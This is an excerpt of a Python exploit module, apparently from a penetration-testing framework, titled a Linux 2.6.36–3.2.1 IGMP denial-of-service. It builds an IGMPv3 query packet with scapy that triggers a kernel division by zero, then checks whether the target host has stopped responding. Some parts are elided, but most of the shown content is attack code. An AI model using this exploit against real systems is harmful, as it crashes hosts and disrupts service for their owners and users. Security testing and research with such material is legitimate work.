...
from scapy.all import send,checksum,IP,conf
import util
...
class igmp_nix(DoS):
	""" Linux 2.6.36 >= version < 3.2.1 IGMP DoS.
		...
		with a max response time of 0; results in a division by zero in the kernel
	"""
	def __init__(self):
		conf.verb = 0
	...
	def initialize(self):
		...
		igmpv3 = pack("!BBH",0x11,0x0,0) + inet_aton("0.0.0.0") + pack("!BBBB",0,0,0,0)
		...
		if self.is_alive():
			...
			util.Msg('Host not responding - it\'s either down or rejecting our probes.')
